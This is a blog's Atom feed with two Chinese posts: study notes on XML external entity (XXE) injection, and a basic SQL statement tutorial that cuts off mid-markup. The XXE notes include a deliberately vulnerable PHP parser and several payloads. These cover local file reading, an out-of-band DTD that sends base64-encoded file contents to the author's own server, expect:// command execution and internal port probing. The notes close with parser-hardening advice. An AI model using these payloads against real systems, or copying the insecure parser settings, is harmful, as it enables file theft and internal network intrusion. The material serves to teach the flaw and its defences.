<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-04-22T02:19:14.670Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XXE学习笔记(持续更新....)</title>
    <link href="https://da4er.top/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-22T02:16:43.000Z</published>
    <updated>2020-04-22T02:19:14.670Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。<br><a id="more"></a></p><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>XML分为三个部分：XML声明，文档类型定义(DTD)，文档元素。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><br>我们主要来看DTD。<br><strong>DTD作用是定义XML文档的合法构建模块，DTD可以在xml文档内声明，也可以外部引用。</strong><br>内部声明DTD：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>引用外部DTD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>内部声明实体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><br>引用外部实体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><br>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。<br><strong>恶意外部引用：</strong><br>一。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><br>二。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><br>DTD文件(evil.dtd)内容：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><br>三。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><br>不同程序支持的协议不一样：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><br>PHP支持的扩展协议有：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"></p><h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><p>一.读取任意文件<br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $creds;</span><br></pre></td></tr></table></figure><br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM <span class="string">"file:///d:/1.txt"</span>&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><br><strong>上面代码是post传参，如果是get传参需要url编码一下。</strong><br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><br>成功读取本地文件内容。</p><p>上面所诉的xxe是回显的，但是在一般情况下xxe是不回显而是用于配置文件。所以我们需要另一种方法：数据外带。<br>原理很简单：就是在一次请求中访问我们自己的vps，而在这个请求之中包含着获取数据的请求.这样就可以让数据回显到我们的vps上。<br>这个有个注意点：<strong>根据规范，我们必须在DTD文件中才能完成”请求中引用另一次的请求的结果”的要求。</strong><br>操作：无回显的XXE<br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     demo1</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-04-22</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="comment">//php支持解析的xml代码</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br></pre></td></tr></table></figure><br>da4er.dtd:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///D:/1.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.1.103:9999?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103/da4er.dtd"</span>&gt;</span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br><span class="line">&lt;convert&gt;%dtd;%int;%send;&lt;/convert&gt;</span><br></pre></td></tr></table></figure><br>这里需要注意几点：<br>1.dtd中send前面的%号要换成html实体编码，因为：实体中不能存在%<br>2.调用逻辑：1.看poc最后一行，首先调用%dtd发送http请求访问192.168.1.103上的da4er.dtd文件；然后调用%int，最后调用%send发送数据到9999端口中。<br>最后成功得到base64加密的数据：<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"><br>二。RCE<br>如果PHP安装了expect扩展，是可以执行rce的。<br>这种情况很少见，并不是传统意义上的任意命令执行，只是因为环境的特殊配置，导致XML与某些命令操作关联，进而造成了命令执行。当PHP环境中的PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，就会造成我们说的这种情况，在这里，我们不做展开讲解。<br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><br>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"expect://whami"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><p>三。XXE配合SSRF攻击内网<br>看到XXE的攻击姿势我们就应该想到xxe是和ssrf一样，可以对内网进行攻击。其实ssrf算不上一个漏洞而是一种攻击模式。<br>探测端口<br>poc:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:80"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><br><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><br>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://192.168.1.103:3305"</span>&gt;</span><br><span class="line"> %dtd;]&gt;</span><br></pre></td></tr></table></figure><img src="/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><p>发现端口开放和不开放的返回结果不同。<br>xxe还有很多攻击内网的姿势：内网主机探测，钓鱼等。像strust2和内网未授权的redis可以直接getshell</p><h3 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h3><p>1.使用开发语言提供的禁用外部实体的方法<br>php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><br>java:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><br>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><br>2.过滤用户提交的XML数据<br>过滤关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br>3.不允许XML中含有自己定义的DTD</p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;XXE漏洞全称叫做XML外部实体注入漏洞，说白了就是程序中xml可控，而且支持引用外部实体定义DTD从而造成此漏洞。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SQL语句Trick...</title>
    <link href="https://da4er.top/SQL%E8%AF%AD%E5%8F%A5Trick.html"/>
    <id>https://da4er.top/SQL%E8%AF%AD%E5%8F%A5Trick.html</id>
    <published>2020-04-12T12:18:35.000Z</published>
    <updated>2020-04-12T12:23:31.137Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>sql语句对大小写不敏感。</p><h3 id="show语句"><a href="#show语句" class="headerlink" title="show语句"></a>show语句</h3><p>show语句用于展示当前所有数据库或者数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/1.png" class title="This is an test image"><a id="more"></a><h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h3><p>语法：<br><code>SELECT 列名称 FROM 表名称</code><br><code>SELECT * FORM 表名称</code><br>星号（*）是选取所有列的快捷方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/2.png" class title="This is an test image"><h3 id="SELECT-DISTINCT语句"><a href="#SELECT-DISTINCT语句" class="headerlink" title="SELECT DISTINCT语句"></a>SELECT DISTINCT语句</h3><p>语法：<br><code>SELECT DISTINCT 列名称 FROM 表名称</code><br>关键字distinct 意思是去除查询中的重复值。<br>注意点：只能查询单个列才能去除重复值，如下图：<br>当查询id，username两个列名的时候是没有去除的，当只查询username的时候才去除成功。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/3.png" class title="This is an test image"><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/4.png" class title="This is an test image"><h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a>WHERE子句</h3><p>WHERE子句用于规定选择的标准。<br>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。<br>语法：<br><code>select 列名称 from 表名称 where 列名称 运算符 值</code><br>下面的运算符可在where子句中使用：</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/5.png" class title="This is an test image"><p>在某些版本的 SQL 中，操作符 &lt;&gt; 可以写为 !=。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">5</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/6.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> != <span class="number">5</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> &lt;&gt; <span class="number">5</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &lt;&gt; <span class="string">'admin'</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/7.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> &gt; <span class="number">20</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/8.png" class title="This is an test image"><p>这里就有个注意点：字符串比较的时候是逐位比较的，如一下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt;<span class="string">'adc'</span>;</span><br></pre></td></tr></table></figure><p>这个语句会将username列的所有字段和abc逐个比较，例如：<br>字段内容admin和abc的比较顺序：<br>admin的第一位先和abc的第一个比较，如果符合比较的条件，继续往后移位比较。<br>如果第一位不满足就退出比较，不再往后进行。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/9.png" class title="This is an test image"><p><strong>比较是按ascii的顺序进行的。</strong><br>但是我们发现上图中的结果中出现了’Admin’ A的ascii码小于a的ascii码，应该不会出现在结果集中。这是因为sql语句比较也属于弱类型的比较，所以再比较的时候会将A转换成a。<br>注意点：<br><strong>1.进行比较的支持16进制，需要在在16进制数前面加上0x，这个时候就比较就不按照ascii了，而是按照16进制的顺序进行比较的。<br>2.如果将字符串和数字进行比较，则字符串是不参与比较的，也不会显示结果集中。</strong><br>如下图：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt; <span class="number">0x61</span>;</span><br><span class="line">// 0x61='a'</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username &gt; <span class="number">0x6165</span></span><br><span class="line">// <span class="number">0x6165</span> = <span class="string">'ad'</span></span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/10.png" class title="This is an test image"><p>注意一点：<strong>如果比较字符和字段内容相等的时候，会继续向后比较，等到大于或小于的时候，才会停止,如下图所示</strong></p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/11.png" class title="This is an test image"><p>我们看到当和’ad’比较的时候，前几个字段前两个字符和ad相等，会继续向后比较，当比较到m的时候，’ad’就没有了字符，相当于最小的ascii码，所以就会返回admin这个字段内容。<br>而当和’admin’这个字段比较的时候，前几个字段都和admin相等，而且都比较到了尾部，所以不会返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">between</span> <span class="string">'admin'</span> <span class="keyword">and</span> <span class="string">'da4er'</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/12.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'adm%'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username regexp <span class="string">'^admin$'</span>;</span><br></pre></td></tr></table></figure><p>like和regexp相当于模糊匹配的功能</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/13.png" class title="This is an test image"><h3 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h3><p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。如果是数值，请不要使用引号。<br>数值使用引号引起来，就表示这个数值的ascii。                                                             <strong>文本值可以使用16进制代替，这就不需要使用引号。</strong></p><h3 id="AND-amp-OR"><a href="#AND-amp-OR" class="headerlink" title="AND&amp;OR"></a>AND&amp;OR</h3><p><strong>AND 和 OR 运算符用于基于一个以上的条件对记录进行过滤。</strong></p><blockquote><p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。<br>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。<br>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">and</span> <span class="keyword">id</span>&gt;<span class="number">7</span> ;</span><br><span class="line"> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span><span class="keyword">or</span> <span class="keyword">id</span>&gt;<span class="number">7</span> ;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/14.png" class title="This is an test image"><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>ORDER BY 语句用于对结果集进行排序。</p><p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p><p>ORDER BY 语句默认按照升序对记录进行排序。</p><p>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">asc</span>; //默认升序</span><br><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">desc</span>; //逆序</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/15.png" class title="This is an test image"><h3 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h3><p>INSERT INTO 语句用于向表格中插入新的行。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line"></span><br><span class="line">也可以指定所要插入数据的列：</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(username) <span class="keyword">values</span>(<span class="string">'zzzz'</span>);</span><br></pre></td></tr></table></figure><p>指定列名的话就不需要将所有列名都要赋值。</p><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/16.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>(<span class="literal">null</span>,<span class="string">'fff'</span>,<span class="string">'https://da4er.top'</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/17.png" class title="This is an test image"><p>不知道列名就要对全部列都要指定值。</p><h3 id="UPDATE语句"><a href="#UPDATE语句" class="headerlink" title="UPDATE语句"></a>UPDATE语句</h3><p>Update 语句用于修改表中的数据。</p><p>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 列名称=新值 <span class="keyword">where</span> 列名称=旧值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set username&#x3D;&#39;http:&#x2F;&#x2F;da4er.top&#39; where username&#x3D;&#39;111&#39;;</span><br></pre></td></tr></table></figure><p>上面这条语句就会把username=111的更新为<a href="http://da4er.top">http://da4er.top</a></p><h3 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h3><p>DELETE 语句用于删除表中的行。<br>语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名称 <span class="keyword">where</span> 列名称=值 //删除某一行</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> table_name</span><br><span class="line"><span class="keyword">delete</span> * <span class="keyword">from</span> table_name</span><br><span class="line">//删除所有行</span><br></pre></td></tr></table></figure><h3 id="TOP语句"><a href="#TOP语句" class="headerlink" title="TOP语句"></a>TOP语句</h3><p>top语句用于规定要返回的记录的数目。<br>并非所有的数据库都支持top子句。<br>sql server语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="built_in">number</span>|<span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br></pre></td></tr></table></figure><p>mysql语法：<br>mysql中使用limit代替top</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="built_in">number</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure><img src="/SQL%E8%AF%AD%E5%8F%A5Trick/18.png" class title="This is an test image"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 